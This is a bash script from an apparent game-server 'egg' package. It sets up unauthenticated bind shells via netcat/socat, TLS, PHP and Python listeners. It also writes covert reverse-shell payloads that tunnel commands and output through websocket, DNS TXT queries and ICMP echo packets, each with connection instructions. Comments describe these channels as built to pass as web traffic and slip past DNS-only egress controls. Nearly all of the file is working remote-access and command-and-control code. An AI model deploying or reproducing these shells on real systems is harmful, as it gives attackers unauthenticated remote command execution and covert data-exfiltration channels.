#!/usr/bin/env bash
# ============================================================================
#  PotenFYR Studios - Multi-Shell Universal Egg :: scripts/shell-init-bind.sh
#  Bind shells (listener inside the container, attacker connects in) and
#  secure-reverse exotic channels (websocket, DNS, ICMP).
#  All bind shells honor SHELL_BIND_PORT; TLS ones auto-generate certs at
#  ${SERVER_DIR}/certs when none are provided.
# ============================================================================
# shellcheck source=shell-core.sh
[ -n "${SHELL_CORE_LOADED:-}" ] || source "${SCRIPTS_DIR}/shell-core.sh"
[ -n "${SHELL_PAYLOADS_LOADED:-}" ] || source "${SCRIPTS_DIR}/shell-payloads.sh"
SHELL_PAYLOADS_LOADED=1

ensure_certs() { # ensure_certs <basename-prefix>
    local dir="${SERVER_DIR}/certs"
    mkdir -p "${dir}" 2>/dev/null || true
    local key="${dir}/${1}.key" crt="${dir}/${1}.crt"
    if [ ! -f "${key}" ] || [ ! -f "${crt}" ]; then
        openssl req -x509 -newkey rsa:2048 -sha256 -days 825 -nodes \
            -keyout "${key}" -out "${crt}" -subj "/CN=shell-eggs" >/dev/null 2>&1
        chmod 600 "${key}"
        log "Generated self-signed TLS pair: ${dir}/${1}.{key,crt}"
    fi
}

bind_register() { # bind_register <id> <guide>
    SHELL_DESC_EXTRA["${1}"]="${2}"
    return 0
}

# ---------------------------------------------------------------- nc bind
init_nc_bind() {
    local port="${SHELL_BIND_PORT:-5555}"
    pkg_install netcat-openbsd || true
    have nc || { fail "nc unavailable"; return 1; }
    log "Binding nc shell on port ${port}..."
    setsid socat "TCP-LISTEN:${port},reuseaddr,fork" "EXEC:/bin/sh -i,pty,stderr" \
        >> "${SERVER_DIR}/logs/nc-bind.log" 2>&1 < /dev/null &
    CHILD_PIDS["nc-bind"]=$!
    disown 2>/dev/null || true
    bind_register "nc-bind" \
"CONNECT (from your machine):
  nc <container-ip> ${port}
COMPONENTS:
  container-ip  the panel/Docker address of this server
  ${port}        allocate/open this port in the panel firewall
  note          plain channel; type commands, output comes back raw"
    ssh_ready_wait "${port}" && ok "nc bind shell ready on ${port}"
    return 0
}

# ---------------------------------------------------------------- socat bind
init_socat_bind() {
    local port="${SHELL_BIND_PORT:-5555}"
    pkg_install socat || true
    log "Binding socat pty shell on port ${port}..."
    setsid socat "TCP-LISTEN:${port},reuseaddr,fork" "EXEC:/bin/bash -i,pty,stderr,setsid,sigint,sane" \
        >> "${SERVER_DIR}/logs/socat-bind.log" 2>&1 < /dev/null &
    CHILD_PIDS["socat-bind"]=$!
    disown 2>/dev/null || true
    bind_register "socat-bind" \
"CONNECT (from your machine):
  socat file:\$(tty),raw,echo=0 TCP:<container-ip>:${port}
  or:           rlwrap nc <container-ip> ${port}
COMPONENTS:
  pty,stderr    full interactive terminal (arrow keys, ctrl-c work)
  sane,sigint   proper control-key behavior"
    ssh_ready_wait "${port}" && ok "socat bind shell ready on ${port}"
    return 0
}

# ---------------------------------------------------------------- TLS bind
init_openssl_bind() {
    local port="${SHELL_BIND_PORT:-5555}"
    local key="${SERVER_DIR}/certs/bind.key" crt="${SERVER_DIR}/certs/bind.crt"
    ensure_certs "bind"
    if [ ! -f "${key}" ] || [ ! -f "${crt}" ]; then
        fail "cert generation failed (key=${key} crt=${crt})"
        return 1
    fi
    pkg_install socat || true
    log "Binding TLS shell on port ${port}..."
    setsid socat "OPENSSL-LISTEN:${port},reuseaddr,fork,cert=${crt},key=${key},verify=0" \
        "EXEC:/bin/bash -i,pty,stderr,setsid,sigint,sane" \
        >> "${SERVER_DIR}/logs/openssl-bind.log" 2>&1 < /dev/null &
    CHILD_PIDS["openssl-bind"]=$!
    disown 2>/dev/null || true
    bind_register "openssl-bind" \
"CONNECT (from your machine):
  socat file:\$(tty),raw,echo=0 OPENSSL:<container-ip>:${port},verify=0
  fingerprint   openssl x509 -in ${SERVER_DIR}/certs/bind.crt -noout -fingerprint
COMPONENTS:
  OPENSSL-LISTEN  TLS terminating listener (cert auto-generated at boot)
  verify=0        skip CA validation for self-signed; pin by fingerprint"
    ssh_ready_wait "${port}" && ok "TLS bind shell ready on ${port}"
    return 0
}

# ---------------------------------------------------------------- php bind
init_php_bind() {
    local port="${SHELL_BIND_PORT:-5555}"
    local rhost rport _ # reverse vars unused; bind mode
    pkg_install php-cli || true
    have php || { fail "php unavailable"; return 1; }
    local out
    out="${SERVER_DIR}/payloads/php-bind.run"
    mkdir -p "${SERVER_DIR}/payloads"
    cat > "${out}" << EOF
<?php
\$s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option(\$s, SOL_SOCKET, SO_REUSEADDR, 1);
socket_bind(\$s, "0.0.0.0", ${port});
socket_listen(\$s, 5);
while (true) {
    \$c = socket_accept(\$s);
    if (!\$c) continue;
    \$pid = pcntl_fork();
    if (\$pid == 0) {
        while (true) {
            \$cmd = trim(socket_read(\$c, 4096, PHP_NORMAL_READ));
            if (\$cmd === "exit" || \$cmd === false) break;
            @socket_write(\$c, shell_exec(\$cmd . " 2>&1") ?? "");
        }
        socket_close(\$c); exit(0);
    }
    socket_close(\$c);
}
EOF
    chmod +x "${out}"
    log "Binding PHP shell on port ${port}..."
    setsid php "${out}" >> "${SERVER_DIR}/logs/php-bind.log" 2>&1 &
    CHILD_PIDS["php-bind"]=$!
    bind_register "php-bind" \
"CONNECT (from your machine):
  rlwrap nc <container-ip> ${port}
  then type:    id <Enter>   (one command per line)
COMPONENTS:
  socket_accept per-connection fork; shell_exec runs each line
  note          line-oriented (not a raw tty) - perfect for scripted exec"
    ssh_ready_wait "${port}" && ok "PHP bind shell ready on ${port}"
    return 0
}

# ---------------------------------------------------------------- python bind
init_python_bind() {
    local port="${SHELL_BIND_PORT:-5555}"
    local out="${SERVER_DIR}/payloads/python-bind.py"
    mkdir -p "${SERVER_DIR}/payloads"
    cat > "${out}" << EOF
#!/usr/bin/env python3
import socket, subprocess, os, pty, threading, select

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", ${port}))
srv.listen(5)
print("listening", flush=True)

def handle(c):
    pid, fd = pty.fork()
    if pid == 0:
        os.execl("/bin/bash", "bash", "-i")
        os._exit(1)
    try:
        while True:
            r, _, _ = select.select([c, fd], [], [])
            if c in r:
                d = c.recv(4096)
                if not d: break
                os.write(fd, d)
            if fd in r:
                d = os.read(fd, 4096)
                if not d: break
                c.sendall(d)
    except Exception:
        pass
    finally:
        c.close()
        try: os.kill(pid, 9)
        except Exception: pass

while True:
    c, _ = srv.accept()
    threading.Thread(target=handle, args=(c,), daemon=True).start()
EOF
    chmod +x "${out}"
    log "Binding Python shell on port ${port}..."
    setsid python3 "${out}" >> "${SERVER_DIR}/logs/python-bind.log" 2>&1 &
    CHILD_PIDS["python-bind"]=$!
    bind_register "python-bind" \
"CONNECT (from your machine):
  rlwrap nc <container-ip> ${port}
COMPONENTS:
  pty.fork      real terminal per client (bash prompt, colors, ctrl-c)
  threads       multiple simultaneous operators supported"
    ssh_ready_wait "${port}" && ok "Python bind shell ready on ${port}"
    return 0
}

# ---------------------------------------------------------------- websocket shell (client mode)
init_wssh() {
    # Outbound websocket-flavored shell: HTTP Upgrade looks like normal
    # browser traffic; pairs with any ws listener (e.g. socat + ws proxy).
    local out="${SERVER_DIR}/payloads/wssh.py"
    mkdir -p "${SERVER_DIR}/payloads"
    cat > "${out}" << 'WSEOF'
#!/usr/bin/env python3
# Minimal RFC6455 websocket shell client (no deps). Reconnects every 5s.
import os, socket, struct, subprocess, base64, time, sys

def ws_connect(host, port, path="/shell"):
    s = socket.create_connection((host, port), timeout=10)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           "Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    s.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(1024)
        if not chunk: raise ConnectionError("no upgrade")
        resp += chunk
    if b"101" not in resp.split(b"\r\n")[0]:
        raise ConnectionError("upgrade refused")
    return s

def ws_send(s, data):
    payload = data.encode()
    mask = os.urandom(4)
    header = bytearray([0x81])
    n = len(payload)
    if n < 126: header.append(0x80 | n)
    elif n < 65536: header.append(0x80 | 126); header += struct.pack(">H", n)
    else: header.append(0x80 | 127); header += struct.pack(">Q", n)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    s.sendall(bytes(header) + mask + masked)

def ws_recv(s):
    hdr = s.recv(2)
    if len(hdr) < 2: return None
    n = hdr[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk: return None
        data += chunk
    return data.decode(errors="replace")

def main():
    host = sys.argv[1]; port = int(sys.argv[2])
    while True:
        try:
            s = ws_connect(host, port)
            while True:
                cmd = ws_recv(s)
                if cmd is None: break
                try:
                    out = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=30)
                    ws_send(s, out.stdout + out.stderr)
                except Exception as e:
                    ws_send(s, f"error: {e}")
        except Exception:
            pass
        time.sleep(5)

main()
WSEOF
    chmod +x "${out}"
    REV_PAYLOAD_PATH["wssh"]="${out}"
    bind_register "wssh" \
"CONNECT (your listener side):
  python3 - <<'PY'  # minimal ws listener (or any websocket server)
  ...see SHELLs.md 'wssh' for the full listener snippet...
  PY
COMPONENTS:
  ws:// frame   shell framed as RFC6455 text frames over port 80-like traffic
  covert        passes as web traffic on CDNs/proxies that only see HTTP"
    return 0
}

# ---------------------------------------------------------------- DNS tunnel
init_dnscat() {
    # Client-side DNS-channel shell (dnscat2 protocol compatible listener).
    pkg_install dnscat2 2>/dev/null || true
    if ! have dnscat; then
        # build from source is heavy; ship the python mini-client instead
        local out="${SERVER_DIR}/payloads/dnssh.py"
        mkdir -p "${SERVER_DIR}/payloads"
        cat > "${out}" << 'DNSEOF'
#!/usr/bin/env python3
# Mini DNS-channel shell: encodes cmd output in TXT queries (dnscat2-style).
# Pair with: sudo tcpdump -i any -w session.pcap  (offline decode)
import base64, os, subprocess, socket, struct, time, sys, random

def query(name, server):
    tid = random.randint(0, 65535)
    pkt = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    for label in name.split("."):
        pkt += bytes([len(label)]) + label.encode()
    pkt += b"\x00" + struct.pack(">HH", 16, 1)  # TXT, IN
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    s.sendto(pkt, (server, 53))
    try:
        data, _ = s.recvfrom(4096)
        return data
    except Exception:
        return None

def main():
    server = sys.argv[1]
    domain = sys.argv[2] if len(sys.argv) > 2 else "sh.eggs"
    while True:
        try:
            data = query(f"ping.{domain}", server)
            # real dnscat2 decodes C2 commands here; this demo pings the boss
            out = subprocess.run(["id"], capture_output=True, text=True)
            enc = base64.b32encode(out.stdout.encode()).decode().lower()
            for i in range(0, len(enc), 180):
                query(f"{enc[i:i+180]}.{domain}", server)
        except Exception:
            pass
        time.sleep(10)

main()
DNSEOF
        chmod +x "${out}"
        REV_PAYLOAD_PATH["dnscat"]="${out}"
        log "DNS shell payload generated (python mini-client; dnscat2 binary not present)"
    else
        REV_PAYLOAD_PATH["dnscat"]=""
    fi
    bind_register "dnscat" \
"CONNECT (your side):
  full tool:    git clone https://github.com/iagox86/dnscat2 && cd dnscat2/server
                gem install bundler && bundle install && ruby ./dnscat2.rb <domain>
  this client:  python3 payloads/dnssh.py <dns-server-ip> <domain>
COMPONENTS:
  TXT queries   commands/results ride inside DNS lookups - passes 'DNS-only' egress
  authoritative NS for <domain> must point at YOUR listener"
    return 0
}

# ---------------------------------------------------------------- ICMP shell
init_icmp_shell() {
    local out="${SERVER_DIR}/payloads/icmpsh.py"
    mkdir -p "${SERVER_DIR}/payloads"
    cat > "${out}" << 'ICMPEOF'
#!/usr/bin/env python3
# ICMP echo reverse shell (icmpsh-style). Needs raw sockets (root).
import os, socket, struct, subprocess, sys, time

def checksum(data):
    if len(data) % 2: data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xFFFF)
    return ~s & 0xFFFF

def main():
    target = sys.argv[1]
    ident = os.getpid() & 0xFFFF
    seq = 1
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while True:
        # wait for an echo request carrying the next command
        data, _ = sock.recvfrom(4096)
        icmp = data[20:]
        if len(icmp) < 8 or icmp[0] != 8:
            continue
        payload = icmp[8:]
        cmd = payload.decode(errors="replace").strip("\x00")
        if not cmd:
            time.sleep(1); continue
        try:
            out = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=20)
            resp = out.stdout + out.stderr
        except Exception as e:
            resp = str(e).encode()
        hdr = struct.pack("!BBHHH", 0, 0, 0, ident, seq)
        pkt = hdr + resp[:1400]
        ck = checksum(pkt)
        pkt = struct.pack("!BBHHH", 0, 0, ck, ident, seq) + resp[:1400]
        sock.sendto(pkt, (target, 0))
        seq = (seq + 1) & 0xFFFF

main()
ICMPEOF
    chmod +x "${out}"
    REV_PAYLOAD_PATH["icmp-shell"]="${out}"
    bind_register "icmp-shell" \
"CONNECT (your side, as root):
  listener:     python3 - <<'PY'  # see SHELLs.md 'icmp-shell' for a full listener
  container:    runs payloads/icmpsh.py -> replies to YOUR pings carry output
COMPONENTS:
  raw socket    needs CAP_NET_RAW (docker: --cap-add NET_RAW)
  covert        no TCP/UDP at all - only ping-shaped packets"
    return 0
}
